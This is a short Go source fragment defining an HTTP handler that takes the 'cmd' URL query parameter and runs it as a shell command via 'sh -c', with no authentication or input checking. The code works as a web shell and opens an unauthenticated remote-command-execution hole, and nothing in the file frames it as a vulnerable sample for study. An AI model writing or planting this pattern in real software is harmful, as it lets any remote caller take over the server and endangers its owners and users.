package main

import (
	"net/http"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query().Get("cmd")
	cmd := exec.Command("sh", "-c", q)
	cmd.Run()
}
